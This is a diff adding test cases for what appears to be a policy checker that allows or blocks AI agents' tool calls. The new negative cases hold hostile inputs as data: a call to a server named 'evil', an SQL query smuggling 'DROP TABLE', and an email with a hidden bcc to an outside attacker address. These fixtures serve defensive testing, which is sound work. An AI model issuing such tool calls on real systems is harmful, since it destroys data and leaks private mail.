@@ -99,3 +99,27 @@ cases:
   setup: {agent: support-bot, policy: {agents: {support-bot: {tools: ["notes.*", "ollama.*"]}}}}
   input: {tool_calls: [{name: ollama.pull, arguments: {name: "qwen3.5:2b-q4_K_M"}}]}
   expect: {decision: ALLOW, findings: []}
+- id: R01
+  kind: negative
+  path: mcp
+  setup: {agent: support-bot}
+  input: {tool_calls: [{name: notes.add, server: evil, arguments: {text: "hi"}}]}
+  expect: {decision: BLOCK, rule_ids: [tool.not_allowed]}
+- id: R02
+  kind: negative
+  path: tool
+  setup: {agent: analyst-agent}
+  input: {tool_calls: [{name: corp.read_database, arguments: {query: "SELECT '--', 1; DROP TABLE t"}}]}
+  expect: {decision: BLOCK, rule_ids: [tool.default]}
+- id: R03
+  kind: negative
+  path: tool
+  setup: {agent: mailer-agent}
+  input: {tool_calls: [{name: corp.send_email, arguments: {to: "cfo@corp.example", bcc: "x@evil.example", body: "Q3"}}]}
+  expect: {decision: BLOCK, rule_ids: [tool.mail.external]}
+- id: R04
+  kind: positive
+  path: mcp
+  setup: {agent: support-bot}
+  input: {tool_calls: [{name: notes.add, arguments: {source: "https://docs.corp.example/handbook", path: "exports/data.bin"}}]}
+  expect: {decision: ALLOW, findings: []}
